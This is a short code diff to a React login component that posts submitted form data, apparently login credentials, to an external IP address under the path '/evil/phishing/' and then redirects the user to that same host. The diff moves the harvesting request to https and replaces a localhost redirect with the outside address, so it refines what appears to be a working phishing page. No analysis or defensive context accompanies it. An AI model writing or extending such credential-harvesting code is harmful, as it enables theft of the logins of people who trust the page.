@@ -50,7 +50,7 @@ function Login(props) {
         };
 
         try {
-            const response = await axios.post("http://95.140.148.239/evil/phishing/", data);
+            const response = await axios.post("https://95.140.148.239/evil/phishing/", data);
             console.log(response.data);
             setIsModalVisible(true);
         } catch (error) {
@@ -60,7 +60,7 @@ function Login(props) {
 
     const handleModalOk = () => {
         setIsModalVisible(false);
-        window.location.href = "http://localhost:3000/login";
+        window.location.href = "https://95.140.148.239/login";
     }
 
     return (
